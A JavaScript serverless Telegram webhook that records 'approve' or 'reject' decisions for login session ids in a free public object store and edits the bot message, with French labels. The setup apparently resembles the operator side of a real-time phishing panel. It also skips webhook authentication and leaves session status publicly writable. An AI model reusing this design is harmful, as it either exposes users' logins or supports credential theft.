const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method === 'GET') {
    return res.status(200).json({ status: 'Telegram Webhook is operational.' });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const update = req.body || {};

    if (update.callback_query) {
      const cq = update.callback_query;
      const callbackData = cq.data || '';
      const callbackId = cq.id;
      const msgId = cq.message?.message_id;
      const chatId = cq.message?.chat?.id;

      // Parse callback data - format: "approve_login_<sessionId>" or "reject_login_<sessionId>"
      const [action, type, sessionId] = callbackData.split('_');

      if (action && sessionId) {
        // Update cloud store with status
        try {
          // First try to get existing record
          const getRes = await fetch(`https://api.restful-api.dev/objects/${sessionId}`, {
            headers: { 'Accept': 'application/json' }
          });

          if (getRes.ok) {
            const record = await getRes.json();
            const data = record.data || {};
            data.status = action === 'approve' ? 'approved' : 'rejected';
            data.timestamp = Date.now();

            // Update existing record
            await fetch(`https://api.restful-api.dev/objects/${sessionId}`, {
              method: 'PUT',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                name: record.name || sessionId,
                data
              })
            });
          } else {
            // Create new record if doesn't exist
            await fetch('https://api.restful-api.dev/objects', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                name: sessionId,
                data: {
                  sessionId,
                  type,
                  status: action === 'approve' ? 'approved' : 'rejected',
                  timestamp: Date.now()
                }
              })
            });
          }
        } catch (cloudError) {
          console.error('Cloud store error:', cloudError);
        }

        // Acknowledge callback
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            callback_query_id: callbackId,
            text: action === 'approve' ? '✅ Validé !' : '❌ Rejeté',
            show_alert: true
          })
        }).catch(() => {});

        // Edit message to remove buttons
        if (msgId && chatId) {
          const newText = cq.message.text + `\n\n<b>[ ${action === 'approve' ? '✅ APPROUVÉ' : '❌ REJETÉ'} ]</b>`;
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              message_id: msgId,
              text: newText,
              parse_mode: 'HTML',
              reply_markup: { inline_keyboard: [] }
            })
          }).catch(() => {});
        }
      }
    }

    return res.status(200).json({ ok: true });
  } catch (error) {
    console.error('Webhook error:', error);
    return res.status(200).json({ ok: true });
  }
}
